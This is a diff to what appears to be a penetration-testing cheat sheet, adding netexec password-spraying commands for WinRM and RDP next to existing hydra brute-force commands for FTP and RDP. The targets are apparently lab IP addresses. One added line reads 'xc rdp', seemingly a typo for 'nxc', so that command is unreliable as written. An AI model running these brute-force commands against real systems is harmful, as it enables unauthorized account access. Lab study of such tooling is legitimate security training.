@@ -66,10 +66,16 @@ hydra -l user -P pass.txt <ip> ftp -t 16 -V
 hydra -l user -P pass.txt <ip> ftp -e nsr -V
 ```
 
+### WINRM
+```bash
+netexec winrm 10.129.42.197 -u user.list -p password.list
+nxc winrm <IP> -u administrator -p /usr/share/wordlists/rockyou.txt
+```
 ### RDP
 
 ```bash
 hydra -l administrator -P pass.txt rdp://<ip> -V
+xc rdp 10.129.18.92 -u username.list -p password.list | grep "+"
 # (use -s 3390 if non-standard port)
 ```
 
